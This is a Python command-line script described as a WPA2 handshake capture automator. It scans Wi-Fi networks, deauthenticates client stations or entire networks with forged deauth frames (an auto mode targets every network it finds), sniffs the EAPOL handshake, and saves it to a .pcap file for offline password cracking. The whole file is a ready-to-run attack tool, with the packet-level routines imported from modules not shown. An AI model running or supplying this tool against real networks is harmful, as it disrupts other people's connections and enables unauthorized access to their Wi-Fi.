#!/usr/bin/env python3

import os
import sys
import argparse

from ap import *
from nic import *
from style import *

from scapy.all import get_if_list, wrpcap


banner = sys.argv[0].split('/')[-1].split('.')[0] + '''\
 [options] [iface]
    -h, --help                      this
    -a, --auto                      target all discovered networks
    -b, --broadcast                 target entire networks (no station scanning)

    -p, --packets    [int]          Send [int] deauthentication packets (3)
    -d, --min-dbm    [int]          minimal signal strength (in dBm) (-90)
    -i, --iterations [int]          try capturing a handshake [int] times (1)

    -e, --essids     [str[,str]..]  target ESSID(s)
    -c, --channels   [int[,int]..]  target channel(s)

    * If no [options] are specified, a simple network scan occurs
    * [iface] must be capable of injecting packets and entering monitor mode
'''


def parse_args():
    if len(sys.argv) < 2:
        print(banner, end = '')
        sys.exit(1)

    parser = argparse.ArgumentParser(
        usage = banner,
        add_help = False,
        description = 'WPA2 handshake capture automator'
    )

    parser.add_argument('-h', '--help',       action = 'store_true')
    parser.add_argument('-a', '--auto',       action = 'store_true')
    parser.add_argument('-b', '--broadcast',  action = 'store_true')

    parser.add_argument('-p', '--packets',    type = int, default = 3)
    parser.add_argument('-d', '--min-dbm',    type = int, default = -90)
    parser.add_argument('-i', '--iterations', type = int, default = 1)

    parser.add_argument('-e', '--essids',     type = str, default = '')
    parser.add_argument('-c', '--channels',   type = str, default = '')

    parser.add_argument('iface', type = str)

    args = parser.parse_args()

    if args.help:
        print(banner, end = '')
        sys.exit(0)

    if args.auto and args.essids:
        raise RuntimeError("Contradictory options: '-a' and '-e'")

    if args.packets <= 0:
        raise ValueError(f'Invalid packet count: {args.packets}')

    if args.min_dbm >= 0:
        args.min_dbm = -args.min_dbm

    if args.iterations <= 0:
        raise ValueError(f'Invalid iteration count: {args.iterations}')

    if args.essids:
        args.essids = [s.strip() for s in args.essids.split(',')]

    if args.channels:
        try:
            args.channels = [abs(int(c)) for c in args.channels.split(',')]

            if list(filter(lambda c: c not in range(1, 15), args.channels)):
                raise ValueError

        except Exception as x:
            raise ValueError(f'Invalid channel list: {args.channels}')
    else:
        args.channels = [i for i in range(1, 15)]

    if not args.iface:
        raise RuntimeError('No [interface] provided')

    args.iface = NetworkInterface(args.iface)

    return args


def print_aps(aps: list):
    print(f'\n{ap_box_head}')

    for ap in aps:
        print(ap)

    print(f'{ap_box_tail}\n')


def print_stations(stations: list):
    print(f'\n{cs_box_head}')

    for s in stations:
        print(s)

    print(f'{cs_box_tail}\n')

# Deauthenticate a client station and sniff EAPOL key frames
def target_station(station: Station, iface: NetworkInterface, packets: int):
    print_message(
        f'Deauthenticating {station.hwaddr}',
        icon = '.', icon_color = color_purple
    )

    station.deauth(iface, count = packets)

    print_message(
        f'Sniffing EAPOL frames', icon = '.', icon_color = color_purple
    )

    station.ap.sniff_handshake(iface)

    return True if station.ap.get_handshake() else False

# Deauthenticate the broadcast and sniff EAPOL key frames
def target_broadcast(ap: AccessPoint, iface: NetworkInterface, packets: int):
    print_message(
        f'Broadcasting deauthentication frames to {ap.essid} ({ap.bssid})',
        icon = '.', icon_color = color_purple
    )

    ap.deauth(iface, count = packets)

    print_message(
        f'Sniffing EAPOL frames', icon = '.', icon_color = color_purple
    )

    ap.sniff_handshake(iface)

    return True if ap.get_handshake() else False


def main(args):
    # Scan the networks
    print_message('Scanning networks', icon = '*')

    aps = scan_aps(
        args.iface, essids = args.essids,
        channels = args.channels, min_dbm = args.min_dbm
    )

    if not aps:
        print_warning('No networks detected')
        return

    print_aps(aps)

    # Exit if there are no target ESSIDs and not running in auto mode
    if not args.essids and not args.auto:
        return

    for ap in aps:
        if args.broadcast:
            # Attack the broadcast args.iterations times
            for _ in range(args.iterations):
                target_broadcast(ap, args.iface, args.packets)

                if ap.get_handshake():
                    print_message('WPA2 handshake captured\n')
                    break

                else:
                    print_warning('No WPA2 handshake captured\n')
        else:
            # Scan the access point for client stations
            print_message(f'Scanning stations in {ap.essid}', icon = '*')

            ap.scan(args.iface)

            if not ap.stations:
                print_warning('No client stations detected')
                continue

            print_stations(ap.stations)

            # Attack the client stations args.iterations times
            for _ in range(args.iterations):
                for station in ap.stations:
                    target_station(station, args.iface, args.packets)

                    if ap.get_handshake():
                        break
                    else:
                        print_warning('No WPA2 handshake captured\n')

                if ap.get_handshake():
                    print_message('WPA2 handshake captured\n')
                    break

        if ap.get_handshake():
            # Write the beacon and handshake messages from to a .pcap file
            wrpcap(f'{ap.essid}.pcap', [ap.beacon] + ap.get_handshake())
            print_message(f'Handshake information written to {ap.essid}.pcap\n')


if __name__ == '__main__':
    ret = 0

    # Exit if not running as root
    if os.geteuid():
        print_exception(RuntimeError('Must be root'))
        sys.exit(1)

    try:
        # Parse arguments
        args = parse_args()

    except Exception as x:
        print_exception(x)
        sys.exit(1)

    try:
        # Set interface to monitor mode
        args.iface.set_monitor(True)

        # Execute the main routine
        main(args)

    except KeyboardInterrupt:
        ret = 3
        print_exception(KeyboardInterrupt('SIGINT received'))

    except Exception as x:
        ret = 2
        print_exception(x)

    try:
        # Set the interface to managed mode
        args.iface.set_monitor(False)

    except Exception as x:
        print_exception(x)

    sys.exit(ret)
